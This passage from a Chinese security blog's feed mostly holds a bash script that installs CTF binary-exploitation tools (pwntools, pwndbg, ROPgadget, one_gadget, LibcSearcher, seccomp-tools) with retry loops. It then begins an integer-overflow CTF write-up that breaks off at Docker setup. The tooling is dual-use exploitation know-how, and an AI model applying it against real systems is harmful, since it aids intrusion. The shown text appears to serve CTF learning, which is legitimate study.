class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;更新、安装常用工具时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;更新、安装常用工具失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装pwntools&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (python3 -m pip install --upgrade pip;python3 -m pip install --upgrade pwntools); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装pwntools时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装pwntools失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装pwndbg&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/pwndbg/pwndbg;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; pwndbg;./setup.sh;&lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;source /ctfpwntools/pwndbg/gdbinit.py&amp;quot;&lt;/span&gt; &amp;gt;&amp;gt; ~/.gdbinit;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装pwndbg时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装pwndbg失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装glibc-all-in-one&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/matrix1001/glibc-all-in-one.git;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; glibc-all-in-one/;python3 update_list;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装glibc-all-in-one时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装glibc-all-in-one失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 安装ROPgadget&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (pip install capstone;git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/JonathanSalwan/ROPgadget.git;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ROPgadget;sudo python3 setup.py install;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装ROPgadget时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装ROPgadget失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# one_gadget&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 32位libc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (apt -y install ruby;gem install one_gadget;dpkg --add-architecture i386;apt-get -y install libc6:i386 libgtk2.0-0:i386); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装one_gadget时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装one_gadget失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# LibcSearcher&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/lieanu/LibcSearcher.git;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; LibcSearcher;python3 setup.py develop;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装LibcSearcher时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装LibcSearcher失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# patchelf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (apt-get install autoconf automake libtool;git &lt;span class=&#34;built_in&#34;&gt;clone&lt;/span&gt; https://github.com/NixOS/patchelf.git;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; patchelf;./bootstrap.sh;./configure;make;make check;make install;&lt;span class=&#34;built_in&#34;&gt;cd&lt;/span&gt; ..); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装patchelf时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装patchelf失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;##  seccomp //安装失败&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;## ruby版本会和上面那个onegadget冲突吗??&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (( i=1; i&amp;lt;=&lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt;; i++ )); &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (add-apt-repository ppa:brightbox/ruby-ng;apt-get install ruby2.6 ruby2.6-dev ;gem install seccomp-tools); &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; [ &lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt; -eq &lt;span class=&#34;variable&#34;&gt;$MAX_RETRY&lt;/span&gt; ]; &lt;span class=&#34;keyword&#34;&gt;then&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装seccomp时出现错误&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;fi&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;安装seccomp失败，正在进行第&lt;span class=&#34;variable&#34;&gt;$i&lt;/span&gt;次重试...&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sleep&lt;/span&gt; 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h2 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h2&gt;&lt;p&gt;pip还是pip3呢&lt;/p&gt;
&lt;p&gt;还有一些小问题、以及还有其他有用工具没安装&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;&lt;a href=&#34;#参考&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/mandiheyanyu/article/details/122455348&#34;&gt;https://blog.csdn.net/mandiheyanyu/article/details/122455348&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;安装工具参考: &lt;a href=&#34;https://blingblingxuanxuan.github.io/2020/02/23/paper/&#34;&gt;https://blingblingxuanxuan.github.io/2020/02/23/paper/&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <category term="脚本" />
        <updated>2023-10-04T12:56:34.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/</id>
        <title>pwn入门-42-BRICS+CTF-整数溢出一题</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/"/>
        <content type="html">&lt;p&gt;题目:paint    附件: 本链接地址+ paint.zip&lt;/p&gt;
&lt;h2 id=&#34;dockerfile使用&#34;&gt;&lt;a href=&#34;#dockerfile使用&#34; class=&#34;headerlink&#34; title=&#34;dockerfile使用&#34;&gt;&lt;/a&gt;dockerfile使用&lt;/h2&gt;&lt;p&gt;执行命令进行构建&lt;/p&gt;
&lt;p&gt;[root@docker Dockerfile]#docker build -t ctfpwn .&lt;br&gt;上条命令中build为构建镜像，而参数t则指定镜像name，.则为Dockerfile的路径&lt;/p&gt;
&lt;p&gt;进去后找libc&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@ff854125b9c3:/&lt;span class=&#34;meta&#34;&gt;# chmod +x /lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 